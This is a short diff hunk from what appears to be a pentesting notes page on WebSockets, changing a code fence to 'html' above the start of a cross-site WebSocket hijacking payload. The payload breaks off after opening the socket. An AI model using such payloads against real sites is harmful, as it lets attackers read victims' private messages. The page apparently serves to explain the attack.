@@ -25,7 +25,7 @@ pagetitle: Websockets
   - Attacker can set up a malicious site to establish the cross-site websocket connection to read contents of messages
 - Payload:
 
-```
+```html
 <script>
     var ws = new WebSocket('wss://{websocket_rl}');
     ws.onopen = function() {
